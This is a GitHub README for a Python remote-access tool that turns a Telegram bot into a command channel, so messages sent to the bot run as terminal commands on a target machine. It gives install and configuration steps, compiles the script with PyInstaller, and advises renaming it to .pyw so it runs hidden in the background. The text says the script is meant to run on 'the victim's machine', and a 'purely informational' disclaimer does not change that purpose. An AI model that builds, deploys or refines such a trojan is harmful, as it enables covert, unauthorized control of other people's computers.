<p align="center"> 
  <img src="https://user-images.githubusercontent.com/107058068/173295144-26031d02-65c3-4972-ac73-909a656a2c76.png" alt="RemoteAccessTelegram" width="80px" height="80px">
</p>
<h1 align="center">Remote Access Telegram</h1> 

## Description
A remote access script for transmitting machine control commands is used by telegram.<br>
This script was written in <a href="https://python.org">python3</a>. Using the <a href="https://pypi.org/project/pyTelegramBotAPI/0.3.0/">pyTelegramBotAPI</a> library.
<br><br>
__This project is purely informational in nature.__
## Installation for python3
### Libraries
- <a href="https://pypi.org/project/pyTelegramBotAPI/0.3.0/">pyTelegramBotAPI</a>
```bash
git clone https://github.com/John-MetrosSoftware/RemoteAccessTelegram
cd RemoteAccessTelegram
pip3 install -r requirements.txt
```
Now you need to edit the file RemoteAccessTelegram.py
```python
bot = telebot.TeleBot('') # Here you need to insert your token.
```
You need to insert a token here. You can get it by creating a bot in <a href="https://telegram.me/BotFather">BotFather</a>.<br>
```python
users = [] # Insert your telegram user id here.
```
In these square brackets you need to enter your telegram user id. You can get it from the <a href="https://t.me/getmyid_bot">Get My ID bot</a>.<br>
This is necessary so that only a limited number of users can use the bot. Since with the help of a bot you will control the machine.<br><br>
Now save the file and run using the command below.
```bash
python3 RemoteAccessTelegram.py
```
Well, the script is running and now you need to run the bot with the command below.
```
/start
```
Commands that the bot processes:
```
exit or quit - Shutdown of the bot on the machine.
```
After executing the 'exit' or 'quit' command, the script on the machine will be terminated.

### Compilation
After all the actions with the file, it must be compiled into an executable file. I will use <a href="https://pypi.org/project/pyinstaller/">Pyinstaller</a>.
```
pyinstaller -F RemoteAccessTelegram.py
```
You can rename the file and change the extension from `.py` on `.pyw` to make the file run in the background process.

## The principle of operation
This script must be run on the victim's machine, your telegram user id must be specified in the script, but this is not necessary and the bot token after running the script, the bot will work in it, all messages that you send will be executed on the victim's machine as terminal commands.
 
```
Script <-- Telegram bot

  Script executing a terminal command...

Script --> Telegram bot
```
Even if some error occurs, it will be returned to the bot by the script.

